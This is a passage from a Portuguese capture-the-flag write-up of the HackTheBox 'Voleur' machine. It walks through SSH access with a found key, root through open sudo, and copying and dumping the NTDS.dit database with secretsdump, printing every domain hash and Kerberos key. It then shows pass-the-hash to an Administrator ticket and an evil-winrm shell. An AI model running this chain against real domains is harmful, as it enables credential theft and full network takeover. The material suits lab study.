I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.
Please see what you can set up.<br><br>
Thanks,<br>
Admin


Resumidamente, essa chave é usada na porta 2222 que descobrimos la no inicio, ela é do usuário **SVC_BACKUP** (descobrimos isso anteriormente no arquivo XLSX) e possui acesso a pasta `backup` da `IT`.

Usando a chave para logar no SSH:

```bash
> ssh voleur.htb -l svc_backup -p 2222 -i id_rsa
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jul  9 01:57:21 PDT 2025

  System load:    0.52      Processes:             9
  Usage of /home: unknown   Users logged in:       0
  Memory usage:   33%       IPv4 address for eth0: 10.129.102.81
  Swap usage:     0%

363 updates can be installed immediately.
257 of these updates are security updates.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Jan 30 04:26:24 2025 from 127.0.0.1
 * Starting OpenBSD Secure Shell server sshd                                                                                                                                           [ OK ] 
svc_backup@DC:~$ 

```

Usando o comando `sudo -l`, vemos que temos permissões completas, então apenas usando `sudo su` conseguimos root na máquina Linux:

```bash
> svc_backup@DC:/$ sudo -l
Matching Defaults entries for svc_backup on DC:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_backup may run the following commands on DC:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL

> svc_backup@DC:/$ sudo su
root@DC:/# 

```

Analisando as pastas do `/mnt`, vemos que na pasta: `/mnt/c/IT/Third-Line Support/Backups` existe um backup do `SAM/LSA`, podemos baixar localmente e extrair as hashs usando o `secretsdump.py`. Para baixar a pasta irei usar o `scp`:

```bash
> scp -i id_rsa -P 2222 -r svc_backup@voleur.htb:/mnt/c/IT/Third-Line\ Support/Backups/ ./
ntds.dit                                                                                                                                                    100%   24MB   2.3MB/s   00:10    
ntds.jfm                                                                                                                                                    100%   16KB  36.5KB/s   00:00    
SECURITY                                                                                                                                                    100%   32KB  73.2KB/s   00:00    
SYSTEM                                                                                                                                                      100%   18MB   2.1MB/s   00:08    

```

E utilizando o `secretsdump.py` localmente, extraimos as hashs e solicitamos o TGT do **Administrator**:

```bash
> secretsdump -ntds "Active Directory/ntds.dit" -system "registry/SYSTEM" -security "Pregistry/SECURITY" LOCAL
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[-] LSA hashes extraction failed: [Errno 2] No such file or directory: 'Pregistry/SECURITY'
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from Active Directory/ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\**SVC_LDAP**:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from Active Directory/ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\**SVC_LDAP**:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\**SVC_LDAP**:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\**SVC_LDAP**:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
[*] Cleaning up... 

```

```bash
> getTGT.py voleur.htb/Administrator -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache

> export KRB5CCNAME=Administrator.ccache     
> evil-winrm -i "dc.voleur.htb" -r VOLEUR.HTB
                                        
Evil-WinRM shell v3.7
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

E com isso conseguimos a flag root e finalizamos a máquina:

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
654471a5001da42030fd1869f97c041d
```